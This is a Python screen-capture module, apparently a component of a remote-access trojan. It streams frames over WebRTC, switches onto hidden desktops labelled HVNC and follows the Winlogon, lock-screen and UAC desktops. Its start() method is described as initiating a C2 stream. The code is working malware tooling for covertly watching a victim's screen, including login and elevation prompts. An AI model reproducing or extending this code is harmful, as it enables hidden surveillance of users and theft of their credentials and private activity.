import time
import numpy as np
try:
    import dxcam
    DXC_AVAILABLE = True
except ImportError:
    DXC_AVAILABLE = False

try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

import ctypes
from core.filters import filter_engine

class CaptureEngine:
    def __init__(self, monitor_idx=0):
        self.monitor_idx = monitor_idx
        self.camera = None
        self.sct = None
        self.mode = "GDI" # Fallback by default
        self.current_style = "Standard"
        self._quality = 80
        self._last_grab_time = time.time()
        self.latest_frame = None  # Exposed for WebRTC
        self._active_desktop_name = None  # Cache for desktop switching
        self.last_frame_hash = None       # For frame deduplication
        self.current_rect = {"left": 0, "top": 0, "width": 1920, "height": 1080}
        self._init_backend()

    def _init_backend(self):
        if DXC_AVAILABLE:
            try:
                # Apex Ultra: Initialize with high-performance threading
                if self.camera:
                    try: self.camera.stop()
                    except: pass
                self.camera = dxcam.create(device_idx=0, output_idx=self.monitor_idx)
                if self.camera:
                    self.mode = "DXGI"
                    # Start continuous background capture at 120Hz for ultra-low latency
                    try:
                        self.camera.start(target_fps=120, video_mode=True)
                        print(f"[Capture] Apex Ultra DXGI Threaded Mode active (120FPS)")
                    except Exception as e:
                        print(f"[Capture] DXGI started in standard mode: {e}")
                    return
            except Exception as e:
                print(f"[Capture] DXGI Init Failed: {e}")

        # Fallback to MSS if DXC fails or is missing
        if MSS_AVAILABLE:
            if not self.sct: self.sct = mss.mss()
            self.mode = "MSS"
            print(f"[Capture] Fallback to MSS active")

    def reinit(self):
        """Forces a hard reset of the capture backend"""
        print(f"[Capture] Triggering Hard Reinit of {self.mode}...")
        self._init_backend()

    def grab(self):
        """Grabs the latest frame with automatic hardware failover, style injection, and stall recovery"""
        now = time.time()
        frame = None
        
        # --- Desktop Switch Handling (for Lock Screen/UAC/HVNC) ---
        # If a specific target desktop is forced (e.g. HVNC), use it, otherwise follow the physical input desktop.
        try:
            h_desk = None
            forced_desktop = getattr(self, "target_desktop", None)
            
            if forced_desktop:
                # Open the specified hidden desktop
                h_desk = ctypes.windll.user32.OpenDesktopW(forced_desktop, 0, False, 0x0100)
            else:
                # Follow the active physical desktop (Default, Winlogon, etc)
                h_desk = ctypes.windll.user32.OpenInputDesktop(0, False, 0x0100)
                
            if h_desk:
                name_buf = ctypes.create_unicode_buffer(256)
                ctypes.windll.user32.GetUserObjectInformationW(h_desk, 2, name_buf, 512, None)
                desktop_name = name_buf.value
                
                # Re-initialize backend if desktop context changes
                if desktop_name != self._active_desktop_name:
                    ctypes.windll.user32.SetThreadDesktop(h_desk)
                    self._active_desktop_name = desktop_name
                    if self.mode == "DXGI": self.reinit() # DXGI needs reset on desktop switch
                    
                ctypes.windll.user32.CloseDesktop(h_desk)
        except: pass
        # -----------------------------------------------------
        
        if self.mode == "DXGI":
            try:
                frame = self.camera.get_latest_frame()
                if frame is not None:
                    self._last_grab_time = now
                else:
                    # Check for stall (no new frame in > 0.5 seconds)
                    if now - self._last_grab_time > 0.5:
                        print(f"[Capture] DXGI Stall detected. Falling back to MSS.")
                        self.mode = "MSS"
            except Exception as e:
                print(f"[Capture] DXGI Hard Error: {e}. Falling back to MSS.")
                self.mode = "MSS"
        
        if self.mode == "MSS" or frame is None:
            try:
                import cv2 as _cv2
                if not self.sct: self.sct = mss.mss()
                monitor = self.sct.monitors[self.monitor_idx + 1]
                sct_img = self.sct.grab(monitor)
                # MSS gives BGRA — convert explicitly to RGB for pipeline consistency
                frame = _cv2.cvtColor(np.array(sct_img), _cv2.COLOR_BGRA2RGB)
            except Exception as e:
                print(f"[Capture] MSS Error: {e}")
                # Try to jump back to DXGI as a last resort
                if now - self._last_grab_time > 5.0:
                    self.reinit()
        
        if frame is not None:
            # Update current geometry for input mapping
            if self.mode == "MSS" and MSS_AVAILABLE:
                self.current_rect = self.sct.monitors[self.monitor_idx + 1]
            elif self.mode == "DXGI" and self.camera:
                # DXCam: Get actual monitor geometry from MSS if available for correct input mapping
                if MSS_AVAILABLE:
                    if not self.sct: self.sct = mss.mss()
                    mon = self.sct.monitors[self.monitor_idx + 1]
                    self.current_rect = mon
                else:
                    self.current_rect = {"left": 0, "top": 0, "width": frame.shape[1], "height": frame.shape[0]}
            
            # Apply dynamic style/filter FX
            frame = filter_engine.apply(frame, self.current_style)
            self.latest_frame = frame  # Expose for WebRTC
            return frame
        
        return None

    def grab_rgb(self):
        """Returns the latest frame in RGB for WebRTC manager."""
        if self.latest_frame is not None:
            # Note: DXCam returns RGB natively in video_mode=True
            return self.latest_frame
        return None

    def set_monitor(self, idx):
        self.monitor_idx = idx
        self.reinit()

    def start(self):
        """Standard control method for C2 stream initiation. Ensure backend is ready."""
        if self.mode == "DXGI" and self.camera and not self.camera.is_capturing:
            try: self.camera.start(target_fps=120, video_mode=True)
            except: pass
        print(f"[Capture] Engine start signal received ({self.mode})")

    def set_style(self, style_name):
        self.current_style = style_name

    def set_quality(self, q):
        self._quality = q

    def quality(self):
        return self._quality

    def get_monitors(self):
        if MSS_AVAILABLE:
            if not self.sct: self.sct = mss.mss()
            return [{"id": i, "name": f"Monitor {i}", "res": f"{m['width']}x{m['height']}"} 
                    for i, m in enumerate(self.sct.monitors[1:])]
        return [{"id": 0, "name": "Monitor 0 (Primary)", "res": "1920x1080"}]

capture_engine = CaptureEngine()
